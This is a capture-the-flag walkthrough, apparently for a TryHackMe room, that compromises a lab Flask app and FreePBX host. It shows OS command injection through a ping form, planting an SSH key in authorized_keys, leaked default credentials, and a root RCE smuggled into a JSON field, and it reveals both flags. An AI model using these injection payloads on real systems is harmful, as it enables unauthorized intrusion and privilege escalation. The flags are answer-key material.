**Room 11 (Infinity Pool) = OS command injection - RCE - FreePBX**

1. `nmap` scan shows 2 open ports: `port 22` (SSH) and `port 80` (HTTP), `gunicorn` header means it's a `Python/Flask` app
2. `robots.txt` leaks `/internal/` and `/status`
• `/static/app.js` has a dev comment: staff netcheck tool at /status posts to /internal/netcheck, "legacy handler, no auth gateway yet" -> unauthenticated
3. `/status` = a "connectivity" form, host param -> backend runs `ping -c 1 {host}` with `shell=True` -> OS command injection
• ";" is filtered, but | $() backticks and newline all get through
4. confirm RCE as web: `curl -s -X POST http://IP/internal/netcheck --data-urlencode 'host=127.0.0.1 | id'`
5. \_{user flag}\_ -> current user is "web", so `cat /home/web/user.txt`

<details>
  <summary>Reveal the 1st flag</summary>

  **_THM{n0_v1s1bl3_3dg3}_**

</details>

6. `/home/web/.ssh/` is writable -> plant a key for a real shell + forward the loopback services:
```
ssh-keygen -t ed25519 -f \~/.ssh/bytelotus -N ""
curl -s -X POST http://IP/internal/netcheck \\
  --data-urlencode "host=127.0.0.1 | echo '$(cat \~/.ssh/bytelotus.pub)' >> /home/web/.ssh/authorized\_keys"
ssh -i \~/.ssh/bytelotus -L 8080:127.0.0.1:8080 -L 3000:127.0.0.1:3000 -L 9000:127.0.0.1:9000 web@IP
```
7. internal recon (`ps aux`, `ss -tlnp`) -> 3 services "Closed Circuit": `edge(web):80`, `watchtower(svc-watch):3000`, `automation(root):9000`, plus `FreePBX :8080` / `AMI :5038` / `mysql :3306`
8. `curl 127.0.0.1:9000/health` self-documents the root vector: `POST /jobs/export`, needs `Authorization: Bearer <automation key>`, body `{"report":"<name>"}`, runs as root -> missing piece = the key
9. `curl 127.0.0.1:3000/api/config` (Watchtower, "authenticated by network position" = no auth on loopback) leaks default `FreePBX` creds: "FreePBXUCPTemplateCreator / St4yN0t1c3d\_2026" + the automation endpoint
10. these creds are `UCP`-only:
• they fail on `FreePBX admin`, on `AMI :5038` and aren't reused on any system account (su svc-watch/asterisk/ubuntu all fail)
• `automation.env` is root-only -> I burned ages trying to become svc-watch/asterisk to steal the key
11. log into UCP `http://127.0.0.1:8080/ucp/` -> dashboard is empty (the tell) -> add a Voicemail widget -> the automation key was templated into a voicemail's Caller ID: `"Automation Key cc\_auto\_7b3f9a1c4e0d2f6a" <9000>`
12. report param is injectable + service runs as root -> `RCE` as root:
```
curl -s -X POST http://127.0.0.1:9000/jobs/export \\
  -H "Authorization: Bearer cc\_auto\_7b3f9a1c4e0d2f6a" \\
  -H "Content-Type: application/json" \\
  --data '{"report":"x.tgz /var/automation/data; cat /root/root.txt #"}'
```
  -> \_{root flag}\_

<details>
  <summary>Reveal the 2nd flag</summary>

  **_THM{tr4c3d_t0_th3_h0r1z0n}_**

</details>

`nmap scan -> robots.txt helps with OS command injection -> RCE -> 1st flag -> SSH keygen -> internal recon reveals FreePBX creds -> add Voicemail widget to /dashboard -> use Automation Key to login as root -> 2nd flag`
